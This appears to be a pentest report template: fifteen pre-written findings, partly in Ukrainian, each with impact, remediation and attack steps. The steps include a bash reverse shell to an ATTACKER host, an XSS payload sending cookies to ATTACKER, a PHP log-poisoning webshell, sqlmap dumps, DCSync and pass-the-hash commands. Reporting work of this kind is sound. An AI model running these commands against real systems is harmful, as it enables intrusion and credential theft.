# Findings Library

> Pre-written findings — копіюй у звіт, підставляй affected asset і Steps to Reproduce зі своїх скрінів.
> Severity: Critical ≥ 9.0 · High 7.0–8.9 · Medium 4.0–6.9 · Low < 4.0

---

## F-01 — SQL Injection
**Severity:** Critical (CVSS ~9.8)
**Опис:** The application passes user-supplied input directly into SQL queries without sanitization or parameterization. An attacker can manipulate query logic to bypass authentication, extract the full database contents, and—if the database user has FILE privileges—read or write arbitrary files on the server.
**Affected Asset:** `[HOST] — [URL/parameter]`
**Steps to Reproduce:**
```
1. Navigate to [URL]
2. Insert payload: ' OR 1=1-- -  in parameter [X]
3. Confirm error-based / union-based response
4. sqlmap -r request.txt --batch --dbs
5. sqlmap -r request.txt --batch -D [db] -T [table] --dump
```
**Impact:** Full database compromise; potential OS-level command execution; authentication bypass.
**Remediation:** Use parameterized queries / prepared statements. Apply principle of least privilege to DB user. Disable FILE privilege. Enable WAF rule for SQL metacharacters.

---

## F-02 — Remote Code Execution via Unrestricted File Upload
**Severity:** Critical (CVSS ~9.8)
**Опис:** The file upload functionality fails to validate uploaded file types by content and restricts only by extension or MIME type header, both of which are attacker-controlled. An attacker can upload a server-side script and execute arbitrary OS commands under the web server's process context.
**Affected Asset:** `[HOST] — [upload endpoint]`
**Steps to Reproduce:**
```
1. Navigate to upload function at [URL]
2. Upload shell.php (Content-Type: image/jpeg, filename: shell.php)
3. Locate stored file at [path]
4. Request: GET /uploads/shell.php?cmd=id
5. Confirm code execution as [user]
```
**Impact:** Full server compromise; lateral movement to internal network; data exfiltration.
**Remediation:** Validate file type by magic bytes server-side. Store uploads outside webroot. Serve files via a dedicated non-executing domain. Rename files on upload.

---

## F-03 — OS Command Injection
**Severity:** Critical (CVSS ~9.8)
**Опис:** User-supplied data is concatenated into an OS-level command without sanitization. An attacker can inject additional commands using shell metacharacters (`;`, `|`, `$()`) and execute arbitrary code as the web server process.
**Affected Asset:** `[HOST] — [parameter]`
**Steps to Reproduce:**
```
1. Identify parameter that triggers OS interaction: [param]
2. Inject: [value]; id
3. Confirm OS output in response
4. Establish reverse shell: [value]; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
```
**Impact:** Arbitrary command execution; full system compromise; pivot to internal network.
**Remediation:** Never pass user input to shell functions. Use language-native APIs instead of exec/system. Whitelist allowable input characters if OS interaction is required.

---

## F-04 — Local File Inclusion (LFI) leading to Remote Code Execution
**Severity:** Critical (CVSS ~9.0)
**Опис:** A PHP `include()` or `require()` function uses unsanitized user input to determine the file path. An attacker can traverse the filesystem to read sensitive files and escalate to RCE via log poisoning or PHP wrapper abuse.
**Affected Asset:** `[HOST] — [parameter, e.g. ?page=]`
**Steps to Reproduce:**
```
1. Confirm LFI: ?page=../../../../etc/passwd
2. Confirm log access: ?page=../../../../var/log/apache2/access.log
3. Poison log: curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/
4. Trigger: ?page=../../../../var/log/apache2/access.log&cmd=id
5. Upgrade to reverse shell
```
**Impact:** Arbitrary file read (credentials, keys, source); RCE via log poisoning.
**Remediation:** Never pass user input to file inclusion functions. Use an allowlist of permitted filenames. Disable `allow_url_fopen` and `allow_url_include` in php.ini.

---

## F-05 — Kerberoasting — Weak Service Account Password
**Severity:** High (CVSS ~8.1)
**Опис:** One or more Active Directory service accounts have Service Principal Names (SPNs) registered and use passwords that are weak or based on dictionary words. Any authenticated domain user can request a Kerberos TGS ticket for these accounts; the ticket is encrypted with the account's NTLM hash and can be cracked offline without interacting with the target.
**Affected Asset:** `[DOMAIN] — Service account: [sAMAccountName]`
**Steps to Reproduce:**
```
1. nxc ldap [DC] -u [user] -p [pass] --kerberoasting kerberoast.txt
2. hashcat -m 13100 kerberoast.txt rockyou.txt -r best64.rule
3. Cracked password: [password] — verified via nxc smb [DC] -u [account] -p [password]
```
**Impact:** Domain account compromise; potential escalation to Domain Admin if account has elevated privileges.
**Remediation:** Enforce strong, random passwords (25+ chars) on all service accounts. Migrate to Group Managed Service Accounts (gMSA). Monitor for unusual TGS requests (Event ID 4769).

---

## F-06 — AS-REP Roasting
**Severity:** High (CVSS ~7.5)
**Опис:** One or more domain accounts have Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH` flag). An unauthenticated attacker can request an AS-REP for these accounts; the response contains data encrypted with the user's password hash and is vulnerable to offline brute-force.
**Affected Asset:** `[DOMAIN] — Account: [sAMAccountName]`
**Steps to Reproduce:**
```
1. nxc ldap [DC] -u [user] -p [pass] --asreproast asrep.txt
2. hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule
3. Cracked: [password]
```
**Impact:** Domain account compromise without prior authentication.
**Remediation:** Enable Kerberos pre-authentication for all accounts unless technically required. Apply strong password policy. Audit accounts with `DONT_REQ_PREAUTH` flag regularly.

---

## F-07 — NTLM Relay Attack
**Severity:** High (CVSS ~8.1)
**Опис:** SMB signing is not enforced on hosts in the environment, and at least one host was observed sending NTLM authentication to a broadcast/multicast address. An attacker positioned on the same network segment can capture NTLM authentication attempts and relay them to other hosts to authenticate as the victim user without knowledge of the password.
**Affected Asset:** `[DOMAIN] — Affected hosts: [list]`
**Steps to Reproduce:**
```
1. Confirm SMB signing: nxc smb [subnet]/24 --gen-relay-list targets.txt
2. sudo responder -I [iface] -dPv (disable SMB/HTTP listeners)
3. ntlmrelayx.py -tf targets.txt -smb2support
4. Trigger: wait for broadcast or coerce with PetitPotam/PrinterBug
5. Captured session / SAM dump
```
**Impact:** Lateral movement; credential harvesting; potential domain compromise if relayed to DC.
**Remediation:** Enable SMB signing on all hosts (required, not just enabled). Disable LLMNR and NBT-NS via Group Policy. Enable Extended Protection for Authentication on IIS/Exchange.

---

## F-08 — Default / Weak Credentials
**Severity:** High (CVSS ~7.5)
**Опис:** The service at [HOST:PORT] accepts authentication using default or trivially guessable credentials. No account lockout or rate-limiting mechanism was observed during testing.
**Affected Asset:** `[HOST:PORT] — Service: [service name]`
**Steps to Reproduce:**
```
1. Navigate to [URL] / connect to [service]
2. Authenticate with: [username] / [password]
3. Confirm access level: [admin/user/root]
```
**Impact:** Unauthorized access to [service]; potential for further exploitation depending on service capabilities.
**Remediation:** Change all default credentials before deployment. Enforce a strong password policy. Implement account lockout after 5 failed attempts. Enable MFA where available.

---

## F-09 — Local Privilege Escalation via SeImpersonatePrivilege
**Severity:** High (CVSS ~7.8)
**Опис:** The compromised service account holds the `SeImpersonatePrivilege` Windows privilege. This privilege allows a process to impersonate tokens of other users; in combination with a potato-family exploit (e.g., PrintSpoofer, GodPotato), a low-privileged attacker can escalate to `NT AUTHORITY\SYSTEM`.
**Affected Asset:** `[HOST] — User: [username]`
**Steps to Reproduce:**
```
1. Confirm privilege: whoami /priv → SeImpersonatePrivilege Enabled
2. Upload PrintSpoofer64.exe or GodPotato
3. .\PrintSpoofer64.exe -i -c cmd → SYSTEM shell
```
**Impact:** Full local system compromise; credential dumping; lateral movement.
**Remediation:** Run web application and service accounts under dedicated low-privilege accounts without SeImpersonatePrivilege. Apply principle of least privilege. Review and audit token privilege assignments.

---

## F-10 — Domain Admin Compromise via DCSync
**Severity:** Critical (CVSS ~9.0)
**Опис:** A compromised account was found to hold Replicating Directory Changes / Replicating Directory Changes All permissions on the domain. These permissions allow the account to request replication of all domain objects including NTLM password hashes via the MS-DRSR protocol (DCSync attack), effectively granting the ability to impersonate any domain user including Domain Admins.
**Affected Asset:** `[DOMAIN] — Account: [sAMAccountName]`
**Steps to Reproduce:**
```
1. Confirm rights via BloodHound: [account] → DCSync edge to [domain]
2. secretsdump.py [domain]/[user]:[pass]@[DC-IP]
3. Extracted NTLM hash for: Administrator, krbtgt
4. Pass-the-Hash as Administrator: evil-winrm -i [DC-IP] -u Administrator -H [hash]
```
**Impact:** Complete domain compromise; all user credentials recoverable; Golden Ticket creation possible.
**Remediation:** Remove DCSync permissions from all non-DC accounts. Audit DS-Replication-Get-Changes ACEs on domain root. Monitor Event ID 4662 for replication requests from non-DC systems.

---

## F-11 — Pass-the-Hash — Lateral Movement
**Severity:** High (CVSS ~8.1)
**Опис:** NTLM password hashes obtained from a compromised host were successfully used to authenticate to additional systems without knowledge of the plaintext password. The technique exploits the NTLM authentication protocol's reliance on the password hash as the authentication secret.
**Affected Asset:** `[SOURCE HOST] → [DESTINATION HOST]`
**Steps to Reproduce:**
```
1. Dumped NTLM hash from [source]: [user]:[hash]
2. evil-winrm -i [dest-IP] -u [user] -H [hash]
   OR impacket-psexec [domain]/[user]@[dest-IP] -hashes :[hash]
3. Authenticated as [user] on [dest-IP]
```
**Impact:** Lateral movement across the network; escalating access without cracking passwords.
**Remediation:** Enable Credential Guard (Windows 10+). Disable NTLM where possible; enforce Kerberos. Ensure local administrator accounts use unique passwords per host (LAPS). Tier administrative accounts.

---

## F-12 — Cross-Site Scripting (Stored / Reflected)
**Severity:** Medium (CVSS ~6.1 reflected / ~8.0 stored)
**Опис:** User-supplied input is rendered in HTML responses without output encoding. An attacker can inject JavaScript that executes in the victim's browser, enabling session cookie theft, credential harvesting, and UI redressing.
**Affected Asset:** `[HOST] — [parameter / form field]`
**Steps to Reproduce:**
```
1. Input payload: <script>alert(document.domain)</script> in [field]
2. Confirm execution in browser
3. Cookie theft: <script>new Image().src='http://ATTACKER/?c='+document.cookie</script>
4. Capture cookie on attacker listener
```
**Impact:** Session hijacking; credential phishing; malware distribution via trusted domain.
**Remediation:** Apply context-sensitive output encoding (HTMLEncode, JSEncode). Implement a strict Content-Security-Policy. Set `HttpOnly` and `Secure` flags on session cookies. Validate and reject HTML metacharacters in user input.

---

## F-13 — Local Privilege Escalation via SUID Binary / Sudo Misconfiguration
**Severity:** High (CVSS ~7.8)
**Опис:** A SUID-bit binary or sudo rule allows a low-privileged user to execute commands in an elevated context. The identified binary is listed on GTFOBins with a known privilege escalation technique requiring no additional exploits.
**Affected Asset:** `[HOST] — Binary: [path]`
**Steps to Reproduce:**
```
1. Identify: find / -perm -4000 2>/dev/null  OR  sudo -l
2. Binary: [binary]  —  GTFOBins technique: [technique]
3. Executed: [command]  →  root shell
```
**Impact:** Full local root compromise; credential dumping from /etc/shadow; pivoting.
**Remediation:** Remove SUID bit from non-essential binaries (`chmod -s`). Review sudo rules; avoid NOPASSWD for shells or file editors. Apply principle of least privilege.

---

## F-14 — Insecure Direct Object Reference (IDOR)
**Severity:** Medium (CVSS ~6.5)
**Опис:** The application uses predictable, user-supplied identifiers to reference internal objects without verifying whether the requesting user is authorized to access the referenced resource. An authenticated attacker can access or modify data belonging to other users by manipulating these identifiers.
**Affected Asset:** `[HOST] — Endpoint: [URL]`
**Steps to Reproduce:**
```
1. Authenticate as user_A; observe request: GET [URL]?id=[A_value]
2. Replace id with [B_value] (another user's resource)
3. Confirm access to user_B's data without authorization
```
**Impact:** Unauthorized access to other users' data; horizontal privilege escalation; potential data breach.
**Remediation:** Enforce server-side authorization checks on every object access. Use indirect references (UUID/token) mapped server-side to internal IDs. Log and alert on failed authorization attempts.

---

## F-15 — SMB Signing Not Required
**Severity:** Medium (CVSS ~5.9)
**Опис:** SMB signing is configured as optional (not required) on the identified hosts. SMB signing prevents man-in-the-middle attackers from modifying SMB packets in transit; without it, NTLM authentication attempts can be captured and relayed to other services (see [[F-07 — NTLM Relay Attack]]).
**Affected Asset:** `[subnet] — Hosts: [list from nxc scan]`
**Steps to Reproduce:**
```
nxc smb [subnet]/24 --gen-relay-list targets.txt
# Hosts appearing in targets.txt have signing not required
```
**Impact:** Enables NTLM relay attacks; amplifies impact of any NTLM credential capture.
**Remediation:** Set `RequireSecuritySignature = 1` via Group Policy (Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options). Enforce on both clients and servers.
